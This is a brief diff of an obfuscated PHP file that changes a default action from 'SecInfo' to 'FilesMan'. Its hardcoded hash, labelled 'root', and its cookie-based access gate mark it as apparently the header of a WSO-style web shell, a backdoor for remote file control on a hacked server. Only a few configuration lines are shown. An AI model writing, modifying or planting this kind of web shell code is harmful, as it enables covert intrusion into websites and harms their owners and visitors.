@@ -4,7 +4,7 @@
 $▛ = ""; //root | 63a9f0ea7bb98050796b649e85481845
 $▘ = true;
 $▜ = 'UTF-8';
-$▚ = 'SecInfo';
+$▚ = 'FilesMan';
 
 $▙ = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."▟"])) {
